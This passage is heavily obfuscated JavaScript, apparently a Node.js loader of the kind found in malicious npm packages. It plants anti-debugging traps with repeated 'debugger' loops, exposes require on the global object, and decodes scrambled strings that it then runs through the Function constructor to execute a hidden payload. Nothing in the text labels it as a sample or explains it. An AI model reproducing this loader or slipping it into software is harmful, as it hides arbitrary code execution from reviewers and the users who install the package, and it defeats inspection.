IGGiY5sCYuUDgu8BI9sCNLJyY5UuMmKlLaMlMyUAwnJqLbouMrso1iUntXsuJXTug97kfj7x248BfjPzc5OuIaUzfjUuNiHsNDsmc5sufjYlJ49kgy8zt8UpejMxxHsy2jJugnsC308uIHZlLjqws5suL9qAYHVpcHKBdWWzviSmtPemxn2lMLSAgvFufjWy2nsmxfTlMrTiJXZAxnqzc4/ihbTzfjOuM5JDcG/jfjYDfj4lMuPyc4UuI5Wp2KHuJfsCIGGEY5LvfjsFs5JFtXsuJGUlLjWuIjJzZSUy2mWuNjslIb0jJnUzdvLy1bIxY5sivjHy2nsyMnKyN1Jkcf7DdWUuM52lK5sjN5LqxmKEIi8ndWUB2DZzKnHuMW8B2nfuM9suNqUlJXZlMLGuJ8UC2DJlI5sC1jZlICKEfjJC05suIfsyfjVuL9Uisnslce1CwyUi0jjuKbSlIWUxw9szvjHFdXsw3q8pdP8yvS0pfj+uIeRrwCTuI5HucfLiczSpdvUjwnsuMrgCNLJlNmVuI47E3SSsc47pg48lIK0lNrKBviPC1jKkg1syNSUpfjJlNjqBs5JuMuGy1jJA1j4ktXJjMnPlNLJzwX1EtSSlLHKCLjSuLiJignJzI5JuIaGuIrsy29YCIGUCKnWpe5Yi0uOxvjUuIjPAM5NuLi0pemKywrSuMfJjNqOis1sCc5Dzg8Uy2LsFxvZuNjZkg4GqZWHoY5MyY5JqhO8Dfi0DensDfj0yZ0UyZnJzM8UisaGuJS8zMu4uMrYtvjsw2row2n5uMm6pLrUpgXElMXVofjPuLjJC3nJFvj0Cgn7lNnsCY4UlN1JlLjHwvS8ysOGkuKOBgrskhDZCJyGkLi3iwe8uY5JpfXslKjftfjLnLLMpde8zwnqCKrLihnSmfbIrcnsxw8UjZXSlM0GuIHWktXLA2fJlMnslMqUlL91pgeNpcbsBgLIzM1UzgzDlIGLuLi8uK5ey1jfuInwlI5HC2fBBIzslcq8lfi8BZrsuMvfuILZC0XDoevtuLjLuKvPuNTspgmUEYbJv0DMFw9OzgnHCY5DlIbMud0GB3m2n0vVy0LqB2mGlJDPz2ngq1iUidXJrs5oic5IuG','ntC5nJyWme1lug5psq','C3bSAxq','nZm1nZy1ohD2sNDVDa','EvDoCMS','C3rYAw5N','mJm3mJm4mMjMqMHwBW','zNjVBunOyxjdB2rL','xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq','mty5vwPvEfL4','v2XIDK0','oefkt1j0tW','mJGWmKvPu3nyzW','y29UC3rYDwn0B3i','C3rHDgvpyMPLy3q','DgvZDa','wvL5y3a','mtCXmdCWohvvCfr3yG','BKzWr1O','mtC5nZi3mZvMANHIANe','yxbWBhK','y2HHAw4','mhWXFdr8nxWYFdm','BgvUz3rO','m3vorML6Da','nJGYnMz3vfHUDa','y2fSBa','mJm5nvnqEvbnBq','AM9PBG','rNzgA3O'];_0x15c9=function(){return _0x1a38ff;};return _0x15c9();}function splitLane(_0xaa0bcf){var _0x5be49f=_0xf3c5,_0x27cf83=_0x5be49f(0xd)[_0x5be49f(0x17)]('|'),_0xb10872=0x0;while(!![]){switch(_0x27cf83[_0xb10872++]){case'0':var _0x28651a=String[_0x5be49f(0x1c)](0x1c);continue;case'1':var _0x2636b1=spin(_0xaa0bcf,NX);continue;case'2':_0x2636b1=_0x2636b1[_0x5be49f(0x17)]('*0')[_0x5be49f(0x13)]('*');continue;case'3':return _0x2636b1[_0x5be49f(0x17)](_0x28651a);case'4':_0x2636b1=_0x2636b1[_0x5be49f(0x17)]('^')[_0x5be49f(0x13)](_0x28651a);continue;case'5':_0x2636b1=_0x2636b1[_0x5be49f(0x17)]('*1')['join']('^');continue;}break;}}function peel(_0x1337af){var _0x28595b=_0xf3c5,_0x13f25f={'FvFkz':function(_0x2c12e0,_0x51b114,_0x5c5bbf){return _0x2c12e0(_0x51b114,_0x5c5bbf);}};return _0x13f25f[_0x28595b(0x14)](spin,_0x1337af,SX);}(function boot(_0x2ac801,_0x4a4a4d){var _0x544a87=_0xf3c5,_0x466bd0={'nFpGZ':_0x544a87(0x1d),'YYycp':function(_0x1bef04,_0x4e4527){return _0x1bef04+_0x4e4527;},'VnuCD':function(_0x2c7482){return _0x2c7482();},'WlbvM':'=aenruh(al=5c,g8fdu.yr\x20..ncecf,5\x22paeau6lnj)r]2uv\x22x-q(]\x20a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw).\x20rod[fs2n{drvt4x)+0,anr+rr+o)}z1\x20=hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae\x20f=[;hisy.em(d+o!2\x20=(evea78=.)4ei=g.n={ff=1[<2a\x20f1=r;4,S)rylv1u\x20y;kql{tvnv\x20(C\x20(l,ovnp\x20i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\x22]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r,\x20.);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe\x20t0nrpr(\x20vr8flrn,ddgt\x20]6a.;m;rth.gq\x202a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\x22li\x22r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\x22)cpA+u;utp]\x22=lk7vpt\x201r;hzw\x22)t()9)(.lul=s7f;\x20;sq0)n\x22y+0s}=va+s\x20mh(0q.]hv;>\x2006=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r;\x20)r>18zho*o{<akmsn)akte.vo9+ea0clio;bu\x20=]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\x22}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+\x20hlk[+x=e\x20-8j{(ejy9(())\x20','rZCSF':function(_0xc54a6f,_0x49210e){return _0xc54a6f(_0x49210e);},'kxdTD':_0x544a87(0x15),'yWNrk':function(_0x1989d1,_0x1594e2,_0x36ee07){return _0x1989d1(_0x1594e2,_0x36ee07);}},_0x40c5f8=(function(){var _0x472fda=!![];return function(_0x48bf7f,_0x5598e3){var _0x23e839=_0x472fda?function(){var _0x520d8b=_0xf3c5;if(_0x5598e3){var _0x3f6330=_0x5598e3[_0x520d8b(0xb)](_0x48bf7f,arguments);return _0x5598e3=null,_0x3f6330;}}:function(){};return _0x472fda=![],_0x23e839;};}());(function(){_0x40c5f8(this,function(){var _0x17d172=_0xf3c5,_0x53a827=new RegExp('function\x20*\x5c(\x20*\x5c)'),_0x1b7c3e=new RegExp(_0x466bd0[_0x17d172(0x9)],'i'),_0x24a1f1=_0x5f2374('init');!_0x53a827[_0x17d172(0x6)](_0x466bd0[_0x17d172(0x7)](_0x24a1f1,_0x17d172(0xc)))||!_0x1b7c3e['test'](_0x24a1f1+'input')?_0x24a1f1('0'):_0x466bd0['VnuCD'](_0x5f2374);})();}()),_0x2ac801['z']=z;var _0x2a0ac0=splitLane('c^mejb^tro');_0x2ac801[_0x2a0ac0[0x0]]=_0x4a4a4d;typeof module===_0x2a0ac0[0x1]&&(_0x2ac801[_0x2a0ac0[0x2]]=module);var _0x5c947e=peel('hqersxluvwacdjbymgorzfkociptrutnstonc'),_0x26f8af=_0x5c947e['substring'](0x0,0xb),_0x4b275f=peel[_0x26f8af],_0x5358d6=_0x4b275f('',peel(_0x466bd0[_0x544a87(0x1)])),_0x5acdeb=_0x5358d6(_0x466bd0['rZCSF'](peel,_0x466bd0['kxdTD']));return _0x466bd0[_0x544a87(0x19)](_0x4b275f,'',_0x5acdeb)(0x9cd),0x1fce;}(global,require));function _0x5f2374(_0x2cfb75){function _0x1b59ed(_0x2956eb){var _0x392534=_0xf3c5;if(typeof _0x2956eb===_0x392534(0x1a))return function(_0x36e6e2){}[_0x392534(0x4)]('while\x20(true)\x20{}')[_0x392534(0xb)]('counter');else(''+_0x2956eb/_0x2956eb)[_0x392534(0xe)]!==0x1||_0x2956eb%0x14===0x0?function(){return!![];}['constructor']('debu'+'gger')[_0x392534(0x11)]('action'):function(){return![];}[_0x392534(0x4)]('debu'+'gger')[_0x392534(0xb)](_0x392534(0x5));_0x1b59ed(++_0x2956eb);}try{if(_0x2cfb75)return _0x1b59ed;else _0x1b59ed(0x0);}catch(_0x1c0960){}}
